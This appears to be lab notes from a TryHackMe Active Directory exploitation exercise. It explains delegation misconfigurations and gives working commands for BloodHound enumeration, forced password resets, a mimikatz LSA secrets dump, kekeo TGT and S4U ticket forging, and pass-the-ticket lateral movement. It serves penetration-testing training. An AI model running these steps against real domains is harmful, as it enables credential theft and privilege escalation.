# Exploiting Active Directory

### AD Exploitation

The exploitation phase exploits misconfigurations to perform a combination of lateral movement and privilege 
escalation until we reach a suitable position to execute our goals, as shown in the diagram below. This 
phase is usually combined with persistence, to ensure that we can't lose the new position we gain, and 
additional enumeration since our new position might allow us to acquire additional information about the lay 
of the land.

![Cyber kill chain](../pictures/kill-chain.png)

**Learning Objectives:**

- AD Delegation
- Forcing Authentication Relays
- Group Policy Objects
- Targeting AD Users
- Domain Trusts
- Silver and Golden Tickets

### Eploiting Permission Delegation

Active Directory can delegate permissions and privileges through a feature called Permission Delegation.
Delegation is what makes AD so powerful in organisations. Imagine we work for an organisation that has 50000 
employees. Since we care about security, we only have three users that have access to DA credentials. It 
would be impossible for those three users to field all requests from the users, such as resetting their 
passwords. Using Delegation, we can delegate the permission to force change a user's password to the 
Helpdesk team, meaning they now have a delegated privilege for this specific function. In principle, to keep 
Delegation secure, the principle of least privilege should be followed.

**Permission Delegation**

Permission Delegation attacks a.k.a ACL-based attacks

AD allows administrators to configure Access Control Entries (ACEs) that populates Discretionary Access 
Control Lists (DACLs), hence the name ACL-based attacks. Almost any AD object can be secured with ACEs, 
which then describe the allowed and denied permissions that any other AD object has against the target 
object.

However, if these ACEs are misconfigured, it may be possible for an attacker to exploit them. Let's look at 
our example again. If the IT Support team were granted the ForceChangePassword ACE over the Domain Users 
group, this would be considered insecure. Sure they would be able to reset the passwords of employees that 
forgot their passwords, but this misconfiguration would allow them to also reset the passwords of privileged 
accounts, such as the accounts that are members of the Domain Admins group essentially allowing for 
privilege escalation.

**Exploiting ACEs**

A significant amount of ACEs can be misconfigured, and the exploits for each vary. The [Bloodhound docs](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#) assist in explaining enumerated ACEs and how they can be exploited.

Notable ACEs:

- ForceChangePassword: We have the ability to set the user's current password without knowing their current 
password.

- AddMembers: We have the ability to add users (including our own account), groups or computers to the 
target group.

- GenericAll: We have complete control over the object, including the ability to change the user's password, 
register an SPN or add an AD object to the target group.

- GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for 
example, update the scriptPath parameter, which would cause a script to execute the next time the user logs 
on.

- WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the 
owner, allowing us to gain additional permissions over the object.

- WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write 
an ACE that grants our account full control over the target object.

- AllExtendedRights: We have the ability to perform any action associated with extended AD rights against 
the target object. This includes, for example, the ability to force change a user's password.

In order to exploit these ACEs, we will need a method to interact with AD to make these requests. The two 
best options for this are: 

- AD-RSAT PowerShell cmdlets
- PowerSploit. 

Depending on the breach and the detection tools in the environment, one option may be stealthier.

**Bloodhound**

Execute SharpHound (same version as BloodHound installation!) on a windows machine connected to the domain

`SharpHound.exe --CollectionMethods All --Domain <DOMAIN> --ExcludeDCs`

Use scp to copy the zip file to our atacking machine:

`scp <USERNAME>@<WINDOWS-MACHINE>:C:/path/to/zip/file .`

Start Neo4j and BloodHound;

```
neo4j console

bloodhound --no-sandbox
```

Authenticate with Neo4j credentials.

**Privilege Escalation**

- Search for privileges associated with the user account
- Search for administrative privileges on all workstations
- View roads in bloodhound leading to accounts for privilege escalation
- Look for permission delegation misconfiguration leading to attack paths

A road from our Domain user to the T2 admins shows that a GenericWrite privilege for IT Support is delegated 
to domain which in turn allows IT Support group members ForceChangePassword of T" admins

Exploit the GenericWrite privilege delegation misconfiguration by adding your domain user to IT Support:

THMWRK1
```
powershell
Add-ADGroupMember "IT Support" -Members
```

**ForceChangePassword**

Find an account to takeover:

`Get-ADGroupMember -Identity "Tier 2 Admins"`

Set a new password:

```
$Password = ConvertTo-SecureString "NewPassword" -AsPlainText -Force
Set-ADAccountPassword -Identity "UsernameOfTarget" -Reset -NewPassword $Password
```

Note: Permissions can take a few minutes to propagate through the domain.

### Exploiting Kerberos Delegation

When talking about AD Delegation, Kerberos Delegation is what is usually being discussed, not Permission 
Delegation.

**Kerberos Delegation**

Kerberos Delegation enables an application to access resources hosted on a different server. An example of 
this would be a web server that needs to access a SQL database hosted on the database server for the web 
application that it is hosting. Without delegation, we would probably use an AD service account and provide 
it with direct access to the database. When requests are made on the web application, the service account 
would be used to authenticate to the database and recover information.

However, we can allow this service account to be delegated to the SQL server service. Once a user logs into 
our web application, the service account will request access to the database on behalf of that user. This 
means that the user would only be able to access data in the database that they have the relevant 
permissions for without having to provide any database privileges or permissions to the service account 
itself.

**Constrained vs Unconstrained**

Unconstrained is the least secure and sets no limits to the delegation. If a user with the 
"TRUSTED_FOR_DELEGATION" flag set authenticates to a host with Unconstrained Delegation configured, a 
ticket-granting ticket (TGT) for that user account is generated and stored in memory so it can be used later 
if needed.

Suppose an attacker can compromise a host that has Unconstrained Delegation enabled. In that case, they 
could attempt to force a privileged account to authenticate to the host, which would allow them to intercept 
the generated TGT and impersonate the privileged service.

To combat the security failings of Unconstrained Delegation, Microsoft introduced Constrained Delegation in 
2003. Constrained Delegation restricts what services an account can be delegated to, limiting exposure if an 
account is compromised. The following are examples of services that can be configured for delegation:

- HTTP - Used for web applications to allow pass-through authentication using AD credentials.
- CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares.
- LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.
- HOST - Allows delegation of account for all activities on the host.
- MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.

Exploiting Constrained Delegation is usually more complex than exploiting Unconstrained Delegation since the 
delegated account can't just be used for everything. However, it can still be used for some powerful 
exploitation.

An example of this would be if we were able to compromise an AD account that had constrained delegation 
configured. By knowing the plaintext password or even just the NTLM hash of this account, we could generate 
a TGT for this account, then use the TGT to execute a ticket-granting server (TGS) request for any 
non-sensitive user account in order to access the service as that user.

**Resource-Based Constrained Delegation**

Introduced by Microsoft in 2012, Resource-Based Constrained Delegation (RBCD) once again provided additional 
restrictions on Kerberos Delegation for security. RBCD changes the delegation model entirely. 

Instead of specifying which object can delegate to which service, the service now specifies which objects 
can delegate to it. This allows the service owner to control who can access it. In our web application 
example, this means that instead of specifying that the web service account can delegate to the database 
service to access the database, we can now specify that on the database service that the web service account 
is allowed to delegate access to it.

Let's say that we have permission to configure RBCD for a service. This means we have the ability to set the 
msDS-AllowedToActOnBehalfOfOtherIdentity attribute for the AD Object. We can populate this attribute with 
the details of an AD account that we have access to. To now gain access to the service, we can generate a 
TGT for the account we control, which will allow us to interact with this service. [Example here](https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/)

**Constrained Delegation Exploitation**

Exploiting Constrained Delegation

Enumerate accounts eligible for exploitation with PowerView

```
PS C:\>Import-Module C:\Tools\PowerView.ps1 
PS C:\>Get-NetUser -TrustedToAuth
```

One account, svcIIS, has the TRUSTED_TO_AUTH_FOR_DELEGATION flag and the msds-allowedtodelegateto attribute 
for http/THMSERVER1.za.tryhackme.loc and WSMAN/THMSERVER1.za.tryhackme.loc. This means the svcIIS account 
can delegate the HTTP and WSMAN services on the target THMSERVER1. 

PowerShell remoting uses the HTTP and WSMAN services allowing us to start remote sessions with Delegation 
to gain Tier 1 Admin access to the target. 

As an Administrator on jump server, run mimikatz to dump LSASecrets showing plain text passwords

```
token::elevate
lsadump:secrets
```

The plain text password for svcIIS is dumped, allowing us to perform a Kerberos delegation attack.

Create a TGT for the compromised service account with kekeo.exe

`tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:password`

Next, we forge TGS requests for the account we want to impersonate for both services (HTTP and WSMAN)

```
# WSMAN
tgs:s4u /tgt:<TGT-FROM-KEKEO> /user:<USER-TO-IMPERSONATE> /service:WSMAN/THMSERVER1.za.tryhackme.loc
# HTTP
tgs:s4u /tgt:<TGT-FROM-KEKEO> /user:<USER-TO-IMPERSONATE> /service:http/THMSERVER1.za.tryhackme.loc
```

Import the TGS tickets into mimikatz

```
# Check privilege
privilege::debug

# import WSMAN TGS
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_WSMAN~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

# import HTTP TGS
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
``` 

Exit mimikatz and verify the tickets are imported with `klist`

Create a PSSession on THMSERVER1 to gain access as a Tier 1 Admin

```
New-PSSession -ComputerName thmserver1.za.tryhackme.loc

Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
```

### Exploiting Automated Relays

